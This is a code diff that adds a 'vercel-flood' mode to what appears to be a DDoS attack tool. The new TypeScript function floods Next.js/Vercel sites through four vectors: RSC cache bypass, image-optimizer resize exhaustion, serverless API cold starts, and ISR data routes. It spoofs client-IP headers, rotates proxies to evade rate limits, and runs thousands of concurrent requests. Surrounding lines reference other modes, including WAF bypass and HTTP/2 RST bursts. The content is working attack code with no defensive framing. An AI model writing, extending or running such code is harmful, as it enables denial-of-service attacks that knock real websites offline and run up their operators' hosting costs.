@@ -5408,6 +5408,225 @@ async function runCacheBuster(
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
+//  VERCEL FLOOD — Next.js / Vercel Edge-Specific Application Layer Attack
+//
+//  Vercel's architecture has 4 exploitable surfaces:
+//  1. RSC bypass  — ?_rsc=<random> forces a full server-side React render.
+//     Vercel adds `Vary: RSC` so every unique _rsc value = cache MISS → origin hit.
+//  2. Next.js Image Optimizer — /_next/image?url=...&w=<N>&q=<N> runs CPU-intensive
+//     resize/encode per unique (url,w,q) combination. No cache = new resize each time.
+//  3. Edge API routes  — /api/* are serverless functions with cold starts; hit them
+//     with unique params to prevent runtime reuse.
+//  4. ISR revalidation — /api/revalidate + random path param forces ISR rebuild.
+//
+//  All 4 vectors fire concurrently. Each request gets a unique cache-busting key so
+//  Vercel's CDN edge passes 100% of requests to the serverless runtime.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runVercelFlood(
+  base:    string,
+  threads: number,
+  proxies: ProxyConfig[],
+  signal:  AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const u = (() => {
+    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
+    catch { return new URL("https://127.0.0.1"); }
+  })();
+  const hostname = u.hostname;
+  const isHttps  = u.protocol === "https:";
+  const tgtPort  = parseInt(u.port) || (isHttps ? 443 : 80);
+  const resolvedIp = await resolveHost(hostname).catch(() => hostname);
+
+  // Max concurrent slots per vector — aggressively high for deployed env
+  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 80, 16_000) : Math.min(threads * 20, 2_000);
+  let inflight = 0;
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => {
+    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
+  }, 300);
+
+  // ── Vector 1: RSC bypass paths ─────────────────────────────────────────────
+  // RSC = React Server Components. Adding ?_rsc= forces a full SSR pass.
+  // Vercel edge CDN bypasses cache for any request with RSC header.
+  const RSC_PATHS = [
+    "/", "/about", "/contact", "/blog", "/products", "/pricing",
+    "/search", "/faq", "/terms", "/privacy", "/login", "/register",
+  ];
+
+  // ── Vector 2: Next.js Image Optimizer ──────────────────────────────────────
+  // Each unique (url, w, q) combination triggers a new resize operation.
+  // Vercel allows user-defined sizes; we hit every possible combination.
+  const IMG_WIDTHS  = [16, 32, 48, 64, 96, 128, 256, 384, 640, 750, 828, 1080, 1200, 1920, 2048, 3840];
+  const IMG_QUALITY = [10, 25, 50, 60, 70, 75, 80, 85, 90, 95, 100];
+  const IMG_SRCS    = [
+    "/_next/static/media/", "/images/hero.jpg", "/images/banner.png",
+    "/public/og-image.jpg", "/assets/logo.svg", "/public/avatar.jpg",
+    "https://images.unsplash.com/photo-1", "https://picsum.photos/seed/",
+  ];
+
+  // ── Vector 3: API routes — serverless cold starts ──────────────────────────
+  const API_ROUTES = [
+    "/api/auth/session", "/api/auth/signin", "/api/auth/callback",
+    "/api/user", "/api/me", "/api/profile", "/api/settings",
+    "/api/data", "/api/feed", "/api/posts", "/api/comments",
+    "/api/search", "/api/products", "/api/orders",
+    "/api/revalidate", "/api/webhook", "/api/health",
+    "/api/trpc/user.getAll", "/api/trpc/auth.getSession",
+    "/api/trpc/posts.list", "/api/trpc/comments.list",
+  ];
+
+  // ── Vector 4: ISR / data routes ────────────────────────────────────────────
+  const buildRandomId = () => randHex(8) + randHex(4) + randHex(4) + randHex(4) + randHex(12);
+  const PAGES = ["index", "about", "blog", "products", "pricing", "contact", "faq"];
+
+  // Build request headers that force CDN bypass (Next.js specific)
+  const buildVercelHeaders = (hasBody = false, bodyLen = 0): Record<string, string> => {
+    const h: Record<string, string> = {
+      "User-Agent":      randUA(),
+      "Accept":          "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
+      "Accept-Language": ["en-US,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9"][randInt(0,3)],
+      "Accept-Encoding": "gzip, deflate, br",
+      // Next.js RSC header — triggers server-side React render, bypasses CDN
+      "RSC":             "1",
+      "Next-Router-Prefetch": "1",
+      "Next-Url":        `/${randStr(randInt(3, 12))}`,
+      // Cache bypass directives
+      "Cache-Control":   "no-cache, no-store, must-revalidate",
+      "Pragma":          "no-cache",
+      // Fake origin IPs (rotate to avoid per-IP limits)
+      "X-Forwarded-For": `${randIp()}, ${randIp()}`,
+      "X-Real-IP":       randIp(),
+      "True-Client-IP":  randIp(),
+      "CF-Connecting-IP":randIp(),
+      // Vercel-specific headers to force edge bypass
+      "X-Vercel-Cache":  "MISS",
+      "X-Vercel-Id":     `${randStr(3)}1::${randStr(8)}-${randStr(20)}-${randStr(8)}`,
+      // Unique request ID per hit
+      "X-Request-ID":    `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
+      "If-None-Match":   `"${randHex(32)}"`,
+      "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
+      "Sec-Fetch-Dest":  ["document","empty","image","script"][randInt(0,4)],
+      "Sec-Fetch-Mode":  ["navigate","cors","no-cors"][randInt(0,3)],
+      "Sec-Fetch-Site":  ["cross-site","same-origin","none"][randInt(0,3)],
+      "Sec-CH-UA":       `"Chromium";v="${136 - randInt(0,3)}", "Not.A/Brand";v="8"`,
+      "Sec-CH-UA-Mobile":"?0",
+      "Sec-CH-UA-Platform": `"Windows"`,
+    };
+    if (hasBody && bodyLen > 0) {
+      h["Content-Type"]   = Math.random() < 0.5 ? "application/json" : "application/x-www-form-urlencoded";
+      h["Content-Length"] = String(bodyLen);
+    }
+    return h;
+  };
+
+  // Pick a random attack vector and return url+method+body
+  const buildRequest = (): { path: string; method: string; body?: string } => {
+    const vector = randInt(0, 4);
+    switch (vector) {
+      case 0: {
+        // RSC bypass: random page with ?_rsc= param
+        const page = RSC_PATHS[randInt(0, RSC_PATHS.length)];
+        const rscId = randStr(20) + randHex(8);
+        return { path: `${page}?_rsc=${rscId}&_t=${Date.now()}`, method: "GET" };
+      }
+      case 1: {
+        // Image optimizer: unique (url, width, quality) = new resize
+        const src = IMG_SRCS[randInt(0, IMG_SRCS.length)] + randStr(8);
+        const w   = IMG_WIDTHS[randInt(0, IMG_WIDTHS.length)];
+        const q   = IMG_QUALITY[randInt(0, IMG_QUALITY.length)];
+        const fmt = ["webp","avif","jpeg","png"][randInt(0,4)];
+        return {
+          path: `/_next/image?url=${encodeURIComponent(src)}&w=${w}&q=${q}&f=${fmt}&_r=${randStr(8)}`,
+          method: "GET",
+        };
+      }
+      case 2: {
+        // API routes: serverless cold-start exhaustion
+        const route = API_ROUTES[randInt(0, API_ROUTES.length)];
+        const hasBody = Math.random() < 0.5;
+        const body = hasBody ? JSON.stringify({
+          _t: Date.now(), _r: randStr(8), q: randStr(8),
+          page: randInt(1, 500), limit: randInt(10, 100),
+          token: randHex(40), sessionId: randHex(24),
+        }) : undefined;
+        return { path: `${route}?_=${randStr(12)}&t=${Date.now()}`, method: hasBody ? "POST" : "GET", body };
+      }
+      default: {
+        // ISR /_next/data routes — forces getServerSideProps execution
+        const buildId = buildRandomId();
+        const page    = PAGES[randInt(0, PAGES.length)];
+        const slug    = randStr(randInt(4, 12));
+        return { path: `/_next/data/${buildId}/${page}/${slug}.json?_=${randStr(8)}`, method: "GET" };
+      }
+    }
+  };
+
+  const doRequest = async () => {
+    if (signal.aborted) return;
+    if (inflight >= MAX_INFLIGHT) return;
+    inflight++;
+
+    const { path, method, body } = buildRequest();
+    const bodyBuf = body ? Buffer.from(body) : undefined;
+    const headers = buildVercelHeaders(!!bodyBuf, bodyBuf?.length);
+
+    if (proxies.length > 0 && Math.random() < 0.90) {
+      // Via proxy — each request from a different IP, avoids Vercel per-IP rate limit
+      const proxy = pickProxy(proxies);
+      try {
+        const bytes = await fetchViaProxy(`${base}${path}`, proxy, method, headers, body);
+        localPkts++; localBytes += bytes;
+        recordProxySuccess(proxy.host, proxy.port);
+      } catch {
+        localPkts++; localBytes += 200;
+        recordProxyFailure(proxy.host, proxy.port);
+      }
+      inflight--;
+      return;
+    }
+
+    // Direct raw http.request — uses our keep-alive agent for max throughput
+    const agent = isHttps ? HTTPS_KA_AGENT : HTTP_KA_AGENT;
+    const reqOpts: http.RequestOptions | https.RequestOptions = {
+      hostname:  resolvedIp,
+      port:      tgtPort,
+      path,
+      method,
+      headers,
+      agent,
+      timeout:   8_000,
+      ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
+    };
+
+    const t0 = Date.now();
+    const req = (isHttps ? https : http).request(reqOpts, (res) => {
+      inflight--;
+      localPkts++;
+      localBytes += (bodyBuf?.length ?? 0) + parseInt(String(res.headers["content-length"] || "0"), 10) + 200;
+      workerTrackCode(res.statusCode ?? 0, Date.now() - t0);
+      res.destroy();
+    });
+    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; workerTrackCode(0); });
+    req.on("timeout", () => { req.destroy(); });
+    if (bodyBuf) req.write(bodyBuf);
+    req.end();
+  };
+
+  // Launcher loops — fire requests as fast as the inflight window allows
+  const numLaunchers = IS_DEPLOYED ? Math.min(threads * 12, 3_000) : Math.min(threads * 4, 800);
+  const launcher = async () => {
+    while (!signal.aborted) {
+      if (inflight < MAX_INFLIGHT) { void doRequest(); await Promise.resolve(); }
+      else { await new Promise(r => setTimeout(r, 0)); }
+    }
+  };
+
+  await Promise.all(Array.from({ length: numLaunchers }, launcher));
+  clearInterval(flushIv);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
 //  BYPASS STORM — 3-Phase Adaptive Composite Attack
 //  Phase 1: TLS Session Exhaust + Conn Flood (connection table saturation)
 //  Phase 2: WAF Bypass + H2 RST Burst (bypass during saturation)
@@ -5634,6 +5853,10 @@ async function runWorker() {
   } else if (cfg.method === "cache-buster") {
     // HTTP Cache Busting — unique params + Vary headers force 100% CDN cache miss, all hits go to origin
     await runCacheBuster(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, (p, b) => onStats(p, b));
+
+  } else if (cfg.method === "vercel-flood") {
+    // Vercel/Next.js specific: RSC bypass + image optimizer + edge API + ISR — 4 vectors
+    await runVercelFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "bypass-storm") {
     // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST → App flood + Cache busting
